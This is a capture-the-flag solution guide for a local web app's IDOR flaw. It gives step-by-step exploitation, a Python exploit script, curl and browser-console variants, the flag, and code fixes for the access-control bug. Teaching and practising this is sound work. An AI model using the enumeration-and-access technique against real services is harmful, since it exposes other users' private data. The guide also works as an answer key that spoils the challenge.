# CTF Solution Guide - NotesVault IDOR Challenge

## Challenge Overview

**Goal:** Exploit IDOR vulnerability to access admin's private note containing the flag  
**Flag:** `FLAG{1d0r_l3ak5_uU1D5_3v3rywh3r3}`  
**Difficulty:** Beginner-Intermediate

---

## Quick Solution

```bash
# 1. Visit public notes page
http://localhost:3000/public

# 2. Click on "admin" user profile
http://localhost:3000/profile/admin

# 3. Open Browser DevTools (F12) > Network tab

# 4. Check the API response from:
GET http://localhost:3000/api/profile/admin

# 5. In the JSON response, find the private note UUID (is_public: 0)

# 6. Access the private note directly:
http://localhost:3000/notes?uuid=<PRIVATE_UUID>

# 7. Read the flag!
```

---

## Detailed Step-by-Step Solution

### Phase 1: Reconnaissance

1. **Access the application**
   ```
   http://localhost:3000
   ```

2. **Register a new account**
   - Username: `hacker`
   - Password: `password123`

3. **Explore the features**
   - Create a few notes (both public and private)
   - Notice that private notes are only visible on your dashboard
   - Browse the public notes feed

4. **Identify the target**
   - In the public notes section, you'll see notes from `admin`
   - Admin has public notes but might have private ones too

### Phase 2: Information Gathering

5. **Visit admin's profile**
   - Click on the "admin" username from any public note
   - Or navigate directly to: `http://localhost:3000/profile/admin`

6. **Inspect network traffic**
   
   **Option A: Using Browser DevTools**
   - Press F12 to open DevTools
   - Go to "Network" tab
   - Refresh the admin profile page
   - Look for the API call: `api/profile/admin`
   - Click on it and view the "Response" tab

   **Option B: Using Burp Suite**
   - Configure your browser to use Burp proxy (127.0.0.1:8080)
   - Visit admin's profile page
   - In Burp, go to "Proxy" > "HTTP history"
   - Find the GET request to `/api/profile/admin`
   - View the response

7. **Analyze the API response**
   ```json
   {
     "username": "admin",
     "bio": "System Administrator",
     "created_at": "2024-01-15T10:30:00.000Z",
     "notes": [
       {
         "uuid": "550e8400-e29b-41d4-a716-446655440000",
         "title": "Welcome to NotesVault!",
         "is_public": 1,
         "created_at": "2024-01-15T10:35:00.000Z"
       },
       {
         "uuid": "550e8400-e29b-41d4-a716-446655440001",
         "title": "Check out our features",
         "is_public": 1,
         "created_at": "2024-01-15T10:40:00.000Z"
       },
       {
         "uuid": "550e8400-e29b-41d4-a716-446655440002",
         "title": "Secret Admin Note",
         "is_public": 0,  // ⚠️ PRIVATE NOTE!
         "created_at": "2024-01-15T10:45:00.000Z"
       }
     ]
   }
   ```

8. **Identify the vulnerability**
   - Notice that `is_public: 0` indicates a PRIVATE note
   - The API is leaking the UUID of private notes!
   - The title "Secret Admin Note" is suspicious

### Phase 3: Exploitation

9. **Copy the private note UUID**
   ```
   UUID: 550e8400-e29b-41d4-a716-446655440002
   ```
   (Your actual UUID will be different - copy it from the API response)

10. **Craft the exploit URL**
    ```
    http://localhost:3000/notes?uuid=550e8400-e29b-41d4-a716-446655440002
    ```

11. **Access the private note**
    - Paste the URL into your browser
    - The application displays the private note WITHOUT checking if you're authorized!

12. **Retrieve the flag**
    The note content reveals:
    ```
    CONFIDENTIAL: Server credentials and flag

    Database Password: db_s3cur3_p@ss
    API Key: sk_live_4829jkdf02klasjdf

    FLAG{1d0r_l3ak5_uU1D5_3v3rywh3r3}

    DO NOT SHARE THIS NOTE!
    ```

---

## Automated Exploitation Script

### Python Script

```python
#!/usr/bin/env python3
import requests
import json

BASE_URL = "http://localhost:3000"

def exploit():
    # Step 1: Get admin's profile data
    print("[*] Fetching admin profile...")
    response = requests.get(f"{BASE_URL}/api/profile/admin")
    data = response.json()
    
    # Step 2: Find private notes
    print("[*] Searching for private notes...")
    private_notes = [note for note in data['notes'] if note['is_public'] == 0]
    
    if not private_notes:
        print("[-] No private notes found!")
        return
    
    print(f"[+] Found {len(private_notes)} private note(s)!")
    
    # Step 3: Access each private note
    for note in private_notes:
        print(f"\n[*] Accessing: {note['title']}")
        print(f"    UUID: {note['uuid']}")
        
        note_url = f"{BASE_URL}/notes?uuid={note['uuid']}"
        print(f"    URL: {note_url}")
        
        # Get the note content
        note_response = requests.get(note_url)
        if note_response.status_code == 200:
            print(f"[+] Successfully accessed private note!")
            
            # Extract flag
            if 'FLAG{' in note_response.text:
                flag_start = note_response.text.find('FLAG{')
                flag_end = note_response.text.find('}', flag_start) + 1
                flag = note_response.text[flag_start:flag_end]
                print(f"\n[+] FLAG FOUND: {flag}")
        else:
            print(f"[-] Failed to access note (Status: {note_response.status_code})")

if __name__ == "__main__":
    print("="*60)
    print("NotesVault IDOR Exploit")
    print("="*60)
    exploit()
```

Run the script:
```bash
python3 exploit.py
```

---

## Alternative Exploitation Methods

### Method 1: Using curl

```bash
# Get admin profile
curl -s http://localhost:3000/api/profile/admin | jq '.notes[] | select(.is_public == 0)'

# Access private note (replace UUID)
curl http://localhost:3000/notes?uuid=YOUR_UUID_HERE
```

### Method 2: Using Burp Suite Repeater

1. Capture the `/api/profile/admin` request in Burp
2. Send it to Repeater
3. Analyze the response to find private UUIDs
4. Create a new request to `/notes?uuid=<UUID>`
5. Send and view the response

### Method 3: Browser Console

```javascript
// Fetch admin profile
fetch('/api/profile/admin')
  .then(r => r.json())
  .then(data => {
    // Find private notes
    const privateNotes = data.notes.filter(n => n.is_public === 0);
    console.log('Private notes:', privateNotes);
    
    // Access first private note
    if (privateNotes.length > 0) {
      window.location.href = `/notes?uuid=${privateNotes[0].uuid}`;
    }
  });
```

---

## Vulnerability Analysis

### Why This Works

1. **Information Disclosure (CWE-200)**
   - The `/api/profile/:username` endpoint returns ALL notes
   - It doesn't filter based on privacy settings
   - UUIDs of private notes are exposed to anyone

2. **Broken Access Control (CWE-639)**
   - The `/notes?uuid=<UUID>` endpoint doesn't verify:
     - If the note is public
     - If the user owns the note
   - Knowing the UUID is enough to access ANY note

3. **No Rate Limiting**
   - Attackers could enumerate all UUIDs
   - No protection against automated exploitation

### Impact

- **Confidentiality Breach**: Private notes can be read by anyone
- **Data Exposure**: Admin credentials and secrets leaked
- **Trust Violation**: Users expect private notes to be private

---

## Defense Mechanisms (How to Fix)

### Fix #1: Implement Proper Access Control

```javascript
app.get('/notes', (req, res) => {
    const { uuid } = req.query;
    
    db.get(`
        SELECT notes.*, users.username 
        FROM notes 
        JOIN users ON notes.user_id = users.id 
        WHERE uuid = ?
    `, [uuid], (err, note) => {
        if (err || !note) {
            return res.status(404).send('Note not found');
        }
        
        // AUTHORIZATION CHECK
        const isOwner = req.session.userId === note.user_id;
        const isPublic = note.is_public === 1;
        
        if (!isPublic && !isOwner) {
            return res.status(403).send('Access Denied');
        }
        
        res.render('note', { note });
    });
});
```

### Fix #2: Filter API Responses

```javascript
app.get('/api/profile/:username', (req, res) => {
    // Get user
    db.get('SELECT * FROM users WHERE username = ?', [username], (err, user) => {
        if (err || !user) return res.status(404).json({ error: 'User not found' });
        
        // Get notes
        db.all('SELECT uuid, title, is_public FROM notes WHERE user_id = ?', 
            [user.id], 
            (err, notes) => {
                // FILTER: Only show public notes to others
                let visibleNotes = notes;
                if (req.session.userId !== user.id) {
                    visibleNotes = notes.filter(note => note.is_public === 1);
                }
                
                res.json({
                    username: user.username,
                    bio: user.bio,
                    notes: visibleNotes
                });
            }
        );
    });
});
```

### Additional Security Measures

1. **Use Indirect References**
   ```javascript
   // Instead of exposing UUIDs directly, use user-specific references
   // Example: /notes/1 where 1 is relative to the user's notes
   ```

2. **Implement Logging**
   ```javascript
   // Log access attempts to detect suspicious behavior
   logger.info(`User ${req.session.userId} accessed note ${uuid}`);
   ```

3. **Add Rate Limiting**
   ```javascript
   const rateLimit = require('express-rate-limit');
   
   const limiter = rateLimit({
       windowMs: 15 * 60 * 1000, // 15 minutes
       max: 100 // limit each IP to 100 requests per windowMs
   });
   
   app.use('/api/', limiter);
   ```

---

## CTF Writeup Template

```markdown
# NotesVault - IDOR CTF Challenge Writeup

## Challenge Info
- **Name**: NotesVault
- **Category**: Web Security
- **Difficulty**: Beginner-Intermediate
- **Points**: 100

## Solution

1. Registered account and explored the application
2. Noticed admin had public notes
3. Visited admin's profile at `/profile/admin`
4. Intercepted API call to `/api/profile/admin` using DevTools
5. Found private note UUID in the API response (is_public: 0)
6. Accessed the private note directly via `/notes?uuid=<UUID>`
7. Retrieved flag: `FLAG{1d0r_l3ak5_uU1D5_3v3rywh3r3}`

## Vulnerabilities
- IDOR in note access
- Information disclosure in profile API

## Flag
`FLAG{1d0r_l3ak5_uU1D5_3v3rywh3r3}`
```

---

## Additional Practice

Try these challenges to deepen your understanding:

1. **Enumerate all users** and find their private notes
2. **Write a script** to automatically extract all flags
3. **Create a Burp Suite macro** to chain the exploitation
4. **Test the fixed version** to confirm vulnerabilities are patched
5. **Find other potential vulnerabilities** in the application

---

## Resources for Further Learning

- [OWASP IDOR Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html)
- [PortSwigger Academy - Access Control](https://portswigger.net/web-security/access-control)
- [HackerOne IDOR Reports](https://hackerone.com/reports?q=type%3Aidor)

---

**Congratulations on completing the challenge! 🎉**
